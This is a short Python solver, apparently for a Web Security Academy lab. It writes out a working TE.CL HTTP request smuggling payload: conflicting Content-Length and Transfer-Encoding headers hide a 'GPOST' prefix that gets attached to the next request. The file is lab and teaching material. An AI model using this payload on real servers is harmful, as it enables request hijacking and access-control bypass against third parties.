from web_security_academy.core.logger import logger
from urllib.parse import urlparse


def solve_lab(session):
    hostname = urlparse(session.url).hostname
    smuggled_prefix = (
        "GPOST / HTTP/1.1\r\n"
        f"Host: {hostname}\r\n"
        "Content-Length: 6\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
    )

    # Chunk = hex(size(chunk body)) + newline + chunk body + newline
    hexof_sizeof_first_chunk_body = f"{len(smuggled_prefix[:-7]):x}"

    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {hostname}\r\n"
        f"Content-Length: {len(hexof_sizeof_first_chunk_body) + 2}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        f"{hexof_sizeof_first_chunk_body}\r\n"
        f"{smuggled_prefix}"
    ).encode()

    session.send_raw(payload)
    logger.info("Prepended the following to the next request:")
    print(smuggled_prefix, end="")

    resp = session.get_path("/")
    logger.info("Received the following response after sending HTTP request:")
    logger.info(resp.text)
